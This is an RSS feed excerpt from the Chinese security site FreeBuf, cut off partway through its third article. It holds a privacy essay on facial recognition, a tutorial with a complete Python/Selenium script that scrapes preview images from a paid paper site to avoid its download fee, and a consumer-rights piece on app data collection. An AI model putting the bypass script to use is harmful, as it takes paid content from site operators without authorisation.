<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>FreeBuf</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/</link>
<description>新鲜的安全资讯库，官网www.freebuf.com</description>
<language>zh-cn</language>
<lastBuildDate>Sat, 14 Apr 2018 02:46:47 +0800</lastBuildDate>
<item>
<title>走在路上能被识别人脸，该为高科技而喜还是为隐私而忧？</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-04-11-35547530.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35547530&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6488283bc4039d30913b3ba2ddf5e83a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;You’ll never find us. But victim or perpetrator, if your number is up, we’ll find you.&lt;br&gt;你永远找不到我们。但无论是受害人还是行凶者，只要你的号码被列出来，我们就会找到你。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;引子&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;4 月春光明媚，下班去公交车站的路上，笔者的同事掏出了口罩，把脸捂得严严实实。&lt;/p&gt;&lt;p&gt;——过敏了？&lt;/p&gt;&lt;p&gt;——不是。&lt;/p&gt;&lt;p&gt;&lt;b&gt;说话间，他指了指面前的红灯，还有一位正在闯红灯的大妈。随后跟我说，最近上海越来越多不守规则闯红灯的行人都收到了上海交警的短信提醒，提示号主某年某日在某条街道不按人行横道信号灯标识通行，行为违法且被交通技术监控等设备记录，要求号主尽快接受处理。&lt;/b&gt;&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0dd4d80ee348ea531ffd769a39691d49_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;1227&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;同事感叹说，现在技术日新月异，走大路上都无时无刻处于摄像头之下。为了保护好自己的隐私，路上还是戴口罩的好。可是我却只能很遗憾地告诉他，警方都表过态，即使是在黑夜里，即使戴上了口罩，高清摄像头加上人脸识别等技术，还是能在茫茫人海中锁定你。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;广泛应用的的人脸识别&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;从2015年到2017年，人脸识别技术经历了从快速落地到多领域应用的井喷式发展。如你所知，现在iPhone X 可以刷脸解锁，坐车、支付能刷脸，走在路上也离不开刷脸。时至今日，“刷脸”已经融入到人们生活的方方面面，在金融、交通、教育、安防、社保等领域发挥着重要作用。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b05a1f960d632ff2f29bf20057ef504a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;250&quot; data-rawheight=&quot;150&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;比起虹膜识别、指纹识别、声音识别等生物识别技术，人脸识别以其独特的特征获取了广泛的市场认可。早期面部识别软件的技术不够成熟，容易受到光线、方向或遮挡物等的影响，导致对比结果不标准。但经过不断的发展与改进，如今的技术已经相当高端，3D 传感器捕捉人脸信息、多摄像头多方位捕捉、皮肤纹理分析乃至热成像相机获取数据等方法都运用到了人脸识别中。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;人脸识别的技术实现&lt;/b&gt; &lt;/h2&gt;&lt;p&gt;人脸识别中的关键环节有三点。&lt;b&gt;首先是人脸检测（Face Detection）&lt;/b&gt;，即在动态的场景与复杂的背景中，判断是否存在面像，并分离出这种面像。人脸检测是人脸识别中的一项关键技术，其方法一般包括基于结构特征的方法，即通过肤色、轮廓、纹理、结构或者直方图特征等进行人脸检测；或基于统计的方法，即通过对于“人脸”和“非人脸”的图像大量搜集构成的人脸正、负样本库，采用统计方法强化训练识别系统，从而实现对人脸和非人脸的检测与分类。常见算法如下：&lt;/p&gt;&lt;blockquote&gt;AdaBoost和Cascade算法&lt;br&gt;二进小波变换&lt;br&gt;基于直方图粗分割和奇异值特征的算法&lt;/blockquote&gt;&lt;p&gt;人脸检测之后的步骤就是人脸配准（Face Alignment），一旦系统检测到人脸，就会确定头部的位置、大小和姿势，根据预先设定好的数值，通过深度学习框架，来定位人脸上的五官关键点。&lt;/p&gt;&lt;p&gt;具体而言，每张脸都有众多可区分的特征，像地球表面的地标一样构成脸部特征的不同高峰和低谷。 这些地标定义为节点。 每个人脸都有大约80个节点，而一些人脸识别软件测量的特征主要为：&lt;/p&gt;&lt;blockquote&gt;眼距&lt;br&gt;鼻子的宽度&lt;br&gt;眼窝深度&lt;br&gt;颧骨的形状&lt;br&gt;下颌线长度&lt;br&gt;……&lt;/blockquote&gt;&lt;p&gt;测量完这些节点之后，系统以精确到亚毫米（甚至微波）级别的精度来测量面部曲线，创建模板，模板（数据）可以转变为唯一数值代码，最终存储为面部印记，为数据库中的人脸创建特征。&lt;/p&gt;&lt;p&gt;&lt;b&gt;第二个关键环节是特征匹配（matching）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果抓取到的图像是3D图像，并且数据库中包含3D图像，就可以直接实现匹配，且不会对图像进行任何更改。不过，很多数据库中的内容还是 2D 的图像，这就需要将抓拍的 3D 图像进行一定的处理。目前常用的技术是，拍摄3D图像时，会重点识别不同的点（例如，重点测量眼睛外侧、眼睛内侧和鼻尖等）。获取测量数据之后，可以使用一些算法把 3D 图像转换为二维图像，再与数据库中的2D图像进行比较和匹配。&lt;/p&gt;&lt;p&gt;&lt;b&gt;第三个环节就是验证和鉴定（Face Verification and Identification）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果是验证（ Verification），图像仅与数据库中的一个图像匹配（1：1），来确认身份。而如果是为了鉴定，则图像会与数据库中的所有图像进行比较，得到匹配评分（1：N）。两种情况下，一般都会设置一个匹配度阈值。在验证中，如果图像与数据库中对应图像的匹配度高于阈值，则为同一人，否则不是。在鉴定中，如果图像与数据库中某个图像的相似度高于阈值，则返回该图像在数据库中对应的身份。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6a93b5f6a9735b521e3b8e917c8f2556_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;280&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;有时候，图像不清晰或者其他原因会导致验证或鉴定失败。此时，使用皮肤生物测量技术分析比对皮肤纹理，则有助于提升验证准确性。皮肤纹理分析的工作方式与面部识别相同，也是利用算法将获取皮肤特征印记并转换为数字代码，形成特征模板。据称，皮肤纹理分析可以识别同卵双胞胎之间的差异。通过将面部识别与表面纹理分析相结合，准确识别率可以增加20％到25％。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;人脸识别技术的现实应用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;人脸识别在现实生活中已经有很多应用，以iPhone X的Face ID技术为例：用户可以通过手机相机中映射的人脸来解锁手机，其识别软件采用3-D建模设计，可防止被照片或面具欺骗，捕捉并比较超过30,000个变量，最终进行验证。不过，iPhone 刚热销那段时间，关于 Face ID 的可靠性与安全性质疑也甚嚣尘上。钓鱼攻击、恶意图像攻击、运行时篡改，甚至图像盗窃等猜测都曾出现在探讨话题中。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-588510e2ff4f04f04bb8b313eca99aaf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;304&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;回到文章开头，人脸识别在交通、安防领域的应用也早已成熟。早在 2001 年，美国弗罗里达州的 Tampa 警察局就部署过带有人脸识别功能的警用相机。时至今日，美国、澳大利亚、新西兰、英国等国家的交通系统都部署了较为成熟的人脸识别技术。在中国，火车站、港口、机场以及多个城市的路口也都部署了带有人脸识别技术的摄像头，用于追踪罪犯，检测违法违规行为，并取得了一定成效。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;随之而来的隐私保护担忧&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018 年 3 月份，深圳行人过马路闯红灯曝光台引起了广泛关注和探讨。刚刚上线时，在其曝光台官网上曝光的信息包括具体地点、时间、违法行人的姓名、身份证号以及路口摄像头抓拍的违法瞬间的照片。这些信息都没有经过打码等任何技术处理，直接展示在页面上。由于网站为公开访问，所以这样很容易造成公民隐私泄露，而在有舆论反馈这个问题后，页面已经有所调整，将姓名、身份账号隐藏部分信息，且将抓拍到的行人面部打码。但这依然引起了大众的担忧。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d8812126b39365717f49ed4305247f9d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;398&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;有律师表示，交警曝光行人闯红灯行为在法律上尚未有明确规定，不能算作是有法可依，最多只能从情理上起到震慑作用。这其实对被曝光者的权益造成了一定影响。&lt;/p&gt;&lt;p&gt;而从另一个层面来说，路上抓拍到违法者照片然后能迅速识别出其身份，匹配到姓名、身份证号信息，甚至发送短信，这背后庞大的数据库信息“功不可没”。&lt;/p&gt;&lt;p&gt;根据警方介绍，“电子警察”或人脸识别摄像头会预设正常交通流量，如果有逆行、闯红灯等行为触发，就会从监控视频中截取违法者的几张图片作为证据，并获取一张清晰正脸图与数据库进行匹配。随后，民警会对相似度在 90% 以上的信息进行人工核实，再确定当事人身份。一般情况下，如果行人或驾驶者待头盔、墨镜或口罩等干扰，只要不是全脸都遮挡，还是可以通过抓拍的图片与数据库对比，进而确认身份。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9cd21d10e030862fdb77286de16026bc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;388&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;早在 2016 年，美国联邦调查局（FBI）就开发了一个庞大的人脸识别系统，获得高达 41.1 亿照片的访问权限。而且 FBI 还基于照片库建立了一个名为“下代识别”（ Next Generation Identification）的数据库。当时 FBI 通过与几个洲“交换合作”才拿到这么多照片资源，分别来自国务院签证和护照数据库、国防部生物识别数据库以及多个驾驶执照数据库。而按照律法，FBI 原本无权访问任何一个州的数据。如果需要建立这种系统，是需要向公众发布公告的。此外，目前的人脸识别系统也尚未配备内部监督机制，不能防止任何滥用。当时，美国公民也对FBI此举侵犯到自己隐私权利而担忧不满，却也无可奈何。&lt;/p&gt;&lt;p&gt;在中国，类似问题也无法忽视。公民的身份证信息、实名购买车票机票、出入境登记、支付渠道的人脸和身份验证等，都能成为交通部门匹配、识别的数据库。在到处都要实名的今天，我们的身份无处可藏。只能期待手握庞大身份数据库的各大机构和组织，能妥善地保护好这些信息。让人们走路不再提心吊胆，而是能在路口那些有着各种功能的电子公示牌前开心地互动。                                               &lt;/p&gt;&lt;b&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8abb8e8432ae13ef636f1b737cfb0084_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;920&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;/b&gt;&lt;p&gt;&lt;b&gt;图片来源： VICE&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考来源&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/twinkle_star1314/article/details/53318689&quot;&gt;人脸检测算法对比分析 - CSDN博客&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://electronics.howstuffworks.com/gadgets/high-tech-gadgets/facial-recognition1.htm&quot;&gt;How Facial Recognition Systems Work&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Facial_recognition_system&quot;&gt;Facial recognition system&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;原文链接&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/neopoints/168177.html&quot;&gt;走在路上能被识别人脸，该为高科技而喜还是为隐私而忧？&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;*本文作者：AdlerI，本文仅代表作者观点，不代表 FreeBuf 立场。&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-04-11-35547530</guid>
<pubDate>Wed, 11 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>一种绕过限制下载论文的思路</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-04-03-35262142.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35262142&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0198c5c5ea70bb9c9460ec3194ef84ee_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;注：本文下面的内容仅讨论绕过思路，作为技术交流之用。大家下载论文还是应该通过正规渠道，付费下载，尊重各位站长的劳动成果。敏感图片和代码中涉及站点的内容均已打码。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;有时候要研究技术，我们也需要下载一些论文来看看的。一些论文站点，虽然提供预览功能，但是下载却是收费的。&lt;/p&gt;&lt;p&gt;举个例子，如下站点：&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9a403375452202a7f8d448cbddf53cff_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;396&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;当我们点击“同意并开始全文预览”按钮时，是有一个弹出窗口来预览论文的。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5cd06d194c7281d057d8223ddcd2c2aa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;332&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;但是当我们点击“下载”按钮时，却提示需要收费。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e26e62d598789df694b052e521e01999_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;636&quot; data-rawheight=&quot;429&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;一方面它单篇论文的收费实在是挺贵的；另外一方面，我们可能更倾向于把论文批量下载到本地，等到有时间时慢慢读完。这该怎么办呢？&lt;/p&gt;&lt;p&gt;我们F12看看预览页面的内容：&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-caa962f52747c22d141f265be6ce131a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;103&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;可以清晰的看到，id=”pdf”的div下的每个子节点div对应着论文的每一页，而每一个子div中包含的img标签对应的图片则是每一页的内容。我们将img标签的src中的链接复制出来，粘贴在浏览器的新页签中，其实是可以看到本页论文内容，而右键“保存图片”是可以将此页论文保存到本地的。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a06f6ee57d1ddc1193fe2767c54ce009_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;287&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;以上就是手动绕过限制下载论文的思路。但是有的论文页数实在太多，手动逐个复制链接下载实在有些效率低下，所以我们可以写个脚本来提升效率。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#coding:utf-8
import traceback
import urllib2
import urllib
import sys
import Queue
import os
import time
from bs4 import BeautifulSoup
from selenium import webdriver
driver = webdriver.Firefox()
driver.implicitly_wait(30) 
host = &quot;此处打码&quot;
searchurl = &quot;https://&quot; + host + &quot;/index.php?m=Search&amp;amp;a=index&quot;
dstpath = &quot;h:/downloadpdf&quot;
download_queue = Queue.Queue()
reload(sys)
sys.setdefaultencoding(&quot;utf-8&quot;)
class UnicodeStreamFilter:  
  def __init__(self, target):  
      self.target = target  
      self.encoding = &#39;utf-8&#39;  
      self.errors = &#39;replace&#39;  
      self.encode_to = self.target.encoding  
  def write(self, s):  
      if type(s) == str:  
          s = s.decode(&quot;utf-8&quot;)  
      s = s.encode(self.encode_to, self.errors).decode(self.encode_to)  
      self.target.write(s)  
        
if sys.stdout.encoding == &#39;cp936&#39;:  
  sys.stdout = UnicodeStreamFilter(sys.stdout) 
def get_search_result(keywords):
  data = {&quot;q&quot;:keywords}
  headers = {&quot;cookie&quot;:&quot;访问论文站点时f12看到的cookie填入此处，此处打码&quot;}
  req = urllib2.Request(url=searchurl,data=urllib.urlencode(data),headers=headers)
  res = urllib2.urlopen(req)
  content = res.read()
  soup = BeautifulSoup(content, features=&quot;lxml&quot;)
  divlist = soup.find_all(class_=&quot;item-title&quot;)
  if divlist is not None and len(divlist) &amp;gt; 0:
      for divitem in divlist:
          alist = divitem.find_all(&quot;a&quot;)
          if alist is not None and len(alist) &amp;gt; 0:
              ahref = alist[0].attrs[&quot;href&quot;]
              title = alist[0].attrs[&quot;title&quot;]
              download_queue.put([
                  &quot;http://%s%s&quot;%(host,ahref,), 
                  title
              ])
def save_pdf(title, imgls, chost):
  headers = {
      &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,
      &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
      &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
      &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
      &quot;Connection&quot;: &quot;keep-alive&quot;,
      &quot;Cookie&quot;: &quot;__cfduid=dd7361d04f439dbfd27d12f286b72afdb1520244765; Hm_lvt_5d91dc9c92e499ab00ba867fc2294136=1520385180&quot;,
      &quot;Upgrade-Insecure-Requests&quot;: 1,
 
     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 
Safari/537.36&quot;
  }
  if not os.path.exists(dstpath):
      os.mkdir(dstpath)
  curdst = dstpath + os.sep + str(title).replace(&quot;.pdf&quot;,&quot;&quot;).decode()
  if not os.path.exists(curdst):
      os.mkdir(curdst)
      pageindex = -1
      for imgitem in imgls:
          if imgitem.attrs[&quot;src&quot;].find(&quot;loading&quot;) != -1:
              continue
          src = imgitem.attrs[&quot;src&quot;]
          src = &quot;http://%s/%s&quot;%(chost,src[3:],)
          pageindex = pageindex + 1
          realpath = curdst + os.sep + str(pageindex) + &quot;.png&quot;
          with open(realpath, &quot;wb&quot;) as f:
              req = urllib2.Request(url=src,headers=headers)
              f.write(urllib2.urlopen(req).read())
              f.flush()
      print &quot;下载&quot;,title,&quot;完成&quot;
  else:
      print curdst,&quot;已存在&quot;
def download_pages():
  while not download_queue.empty():
      url,title = download_queue.get()
      html = urllib.urlopen(url).read()
      signal = &quot;javascript:viewLogin.viewDl(&#39;&quot;
      if html.find(signal) != -1:
          cid = html[html.find(signal) + len(signal):]
          cid = cid[:cid.find(&quot;&#39;&quot;)]
          pagerequest_url = &quot;http://%s/index.php?g=Home&amp;amp;m=View&amp;amp;a=viewUrl&amp;amp;cid=%s&amp;amp;flag=1&quot;%(host,cid,)
          pagereal_url = urllib.urlopen(pagerequest_url).read()
          chost = pagereal_url[2:].split(&quot;/&quot;)[0]
          pagereal_url = &quot;http:%s&quot;%(pagereal_url,)
          driver.get(pagereal_url)
          try:
              time.sleep(3)
              #每次移动滚动条的距离
              distance = 300
              #统计img标签的个数，下拉时会新增img标签
              pimgnum = 0
              #img标签个数不再发生变化的次数
              samecount = 0
              while True:
                  driver.execute_script(&#39;$(&quot;#pdf&quot;).scrollTop(%s);&#39;%distance)
                  time.sleep(2)
                  distance = distance + 300
                  cimgnum = len(driver.find_elements_by_tag_name(&quot;img&quot;))
                  if cimgnum != pimgnum:
                      pimgnum = cimgnum
                      samecount = 0
                      continue
                  else:
                      samecount = samecount + 1
                  #当img标签不再发生变化的次数达到20次时，则表明全部加载完毕
                  if samecount &amp;gt;= 20:
                      break
              
              pagecontent = driver.page_source
              soup = BeautifulSoup(pagecontent, features=&quot;lxml&quot;)
              imgls = soup.find_all(&quot;img&quot;)
              if imgls is not None and len(imgls) &amp;gt; 0:
                  save_pdf(title, imgls, chost)
              
          except Exception,e:
              traceback.print_exc()
if __name__ == &#39;__main__&#39;:
  keywords = &quot;攻击树&quot;
  get_search_result(keywords)
  download_pages()
  driver.quit()&lt;/code&gt;&lt;p&gt;脚本主要步骤如下：&lt;/p&gt;&lt;p&gt;1.根据传入的关键字(keyword字段），模拟搜索请求；得到与该关键字相关的论文的标题以及url&lt;/p&gt;&lt;p&gt;2.打开论文对应的url，此时的页面还不是真实的论文全文页面；定位到预览关键字段cid（在javascript:viewLogin.viewDl(）方法中），发送请求，得到论文真实全文页面的对应的url&lt;/p&gt;&lt;p&gt;3.由于论文预览采用了逐步加载的模式，即最初显示3页，然后随着滚动条的拖动再逐渐加载后续内容；所以使用selelium模拟滚动页面内容，判断是否有新页面被加载出来，直至页面内容不再发生变化为止&lt;/p&gt;&lt;p&gt;4.此时基于第三部加载出的全部页面内容，提取img字段，逐个保存到本地；即对应着论文的每一页&lt;/p&gt;&lt;p&gt;脚本运行效果如下：&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7bf5df3048a9602023d9d097b49f8917_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;122&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;得到的论文：&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e8a9e484d7728d643c2d1c01bde621a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;581&quot; data-rawheight=&quot;247&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4ad65e4a83e41dd799353ef2dae5f948_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;407&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;如果网络效果不是很好，可以适当将sleep时间延长。跑个脚本吃个饭回来，论文都下好了，还是很爽的。&lt;/p&gt;&lt;p&gt;原文链接：&lt;a href=&quot;http://www.freebuf.com/articles/web/164516.html&quot;&gt;一种绕过限制下载论文的思路 - FreeBuf互联网安全新媒体平台 | 关注黑客与极客&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;* 本文作者：tammypi，本文属FreeBuf原创奖励计划，未经许可禁止转载&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-04-03-35262142</guid>
<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>315黑名单之夜，信息安全谁能逃过此劫？</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-15-34587092.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34587092&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d85922a34605dd4f63358fa7fde35a71_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;还有几个小时，315晚会就开始了，估计已经有一部分公司做好了预防自己中招的准备，公关团队+舆情监控系统蓄势待发，密切关注着315的一举一动，一旦有“万一”，第一时间做好公关工作，尽可能降低负面影响。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;今年315晚会的主题是“品质消费，美好生活”，唤醒消费者权益意识，规范市场秩序依然是不变的宗旨。互联网已经深入人们的日常生活，与之相关的安全信息领域也逐渐成为315晚会重点关注对象。2017年的315晚会上，互动百科虚假广告、科视公司收集学生信息以及不安全的密码等消费预警。由此也可以发现，普通消费者对于个人隐私、信息保护等方面的安全意识比较薄弱，2017年依旧衍生了不少风波，又会有哪些案例或者公司成为315重点照顾对象呢？&lt;/b&gt;&lt;/p&gt;&lt;b&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9fdbac2f1e191f36a9e913d1b75ffcc4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;403&quot;&gt;&lt;/u&gt;&lt;/b&gt;&lt;p&gt;FreeBuf作为关注互联网安全的媒体，本无意预测315晚会的曝光内容，只是借机315国际消费者权益日，让更多用户关注到信息安全，加强防范意识，同时避开一些消费陷阱。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;一、九成APP过度采集信息&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;智能手机已经人手不止一部，在方便日常沟通的同时也衍生了一些安全隐患，而更多的是来自手机APP。北京市消费者协会近日发布《手机APP个人信息安全调查通告》，调查结果显示，89.62%的人认为手机APP存在过度采集个人信息，79.32%的人认为手机APP上的个人信息并不安全，41.16%的人在安装或者使用手机APP之前从来吧屮授权须知。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4b4aed706e5e0b8d45d71b8af8f4e74f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;417&quot;&gt;&lt;/u&gt;&lt;p&gt;其中， 被手机APP采集最多的个人信息依次是联系方式、姓名和头像，而消费者最担心被采集的个人信息是身份证号和银行账号，害怕这些个人信息被采集后进行贩卖或者从事诈骗等活动。&lt;/p&gt;&lt;p&gt;而相关的投诉案件也越来越多，关注度最高的应该是江苏消保委起诉百度网讯科技有限公司一案，江苏消保委认为，“手机百度”、“百度浏览器”两款APP在消费者安装前，未告知其所获取的各种权限及目的，在未经过用户同意的情况下，获取诸如“监听电话、 定位、读取短彩信、读取联系人”等重要隐私权限。尽管后期事件因百度澄清之后渐渐平息，但却无法消除用户对手机APP擅自手机个人信息的担忧。&lt;/p&gt;&lt;blockquote&gt;监测数据认为，手机APP过度采集个人信息已经成为网络诈骗的主要源头之一。《消费者权益保护法》、《网络安全法》有明确规定，收集使用消费者个人信息， 应当遵循合法、正当、和必要的原则。尽管这一类规定中存在有一些不足需要完善， 但这并不妨碍此类事件成为今年315晚会的主题之一。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;二、时隔五年，苹果是否会再登315舞台？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2013年，苹果因“后盖门”和国内外售后政策不一的问题成为当年315晚会重点照顾对象。而这一年来，苹果遭遇的屡次负面事件（降频门和iCLoud隐私门），或许又将助力苹果重登315晚会舞台。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-03c642e35d6599f8aa8aa57e60e79cf7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; 